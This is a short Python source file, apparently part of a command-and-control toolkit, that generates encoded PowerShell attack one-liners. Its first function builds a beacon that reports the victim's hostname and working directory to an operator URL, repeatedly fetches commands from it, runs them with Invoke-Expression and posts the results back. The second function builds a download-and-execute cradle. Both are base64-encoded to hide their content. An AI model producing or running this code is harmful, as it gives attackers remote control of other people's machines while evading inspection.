from base64 import b64encode

def generate_payload(url):
    payload = """
    $ProgressPreference = 'SilentlyContinue'
    $sleep = 1
    $post = ''
    $url = "%URL%/"
    $register_url = $url + "/register"

    $cwd = ($pwd).path
    $hostname = hostname
    $register = @{
        "hostname"=$hostname;
        "cwd"=$cwd
    }

    $id = Invoke-RestMethod $register_url -Method POST -Body ($register|ConvertTo-Json) -ContentType "application/json; charset=utf-8"
    $url = $url + $id

    while ($true)
    {
        Start-Sleep -Seconds $sleep
        $cmd = Invoke-WebRequest $url
        if ($cmd.Content -eq '') { continue }

        $result = Invoke-Expression $cmd
        
        if ($result -is [string]) { $post = $result }
        elseif ($result -is [array])
        {
            foreach ($line in $result)
            {
                $post += $line.ToString() + "%NL%"
            }
        }

        Invoke-RestMethod -Uri $url -Method POST -Body $post -ContentType 'text/plain; charset=utf-8'
        $post = ''
    }
    """
    payload = payload.replace("%URL%", url)
    encoded = b64encode(payload.encode('UTF-16LE'))
    return "powershell.exe -enc " + str(encoded).replace("b'", "").replace("'", "")

def generate_iwr(url):
    payload = "iex (iwr '%URL%/iwr' -UseBasicParsing)"
    payload = payload.replace("%URL%", url)
    encoded = b64encode(payload.encode('UTF-16LE'))
    return "powershell.exe -enc " + str(encoded).replace("b'", "").replace("'", "")